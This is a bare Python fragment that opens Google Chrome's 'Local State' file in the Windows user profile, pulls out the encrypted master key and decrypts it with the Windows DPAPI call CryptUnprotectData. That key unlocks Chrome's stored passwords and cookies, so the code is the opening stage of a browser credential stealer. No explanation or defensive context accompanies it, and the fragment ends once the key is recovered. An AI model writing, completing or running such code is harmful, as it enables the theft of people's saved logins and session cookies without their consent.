import os, json, base64, win32crypt

local_state = open(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "r").read()

encryption_key = json.loads(local_state)["os_crypt"]["encrypted_key"]
encryption_key = base64.b64decode(encryption_key)
encryption_key = win32crypt.CryptUnprotectData(encryption_key[5:], None, None, None, 0)[1]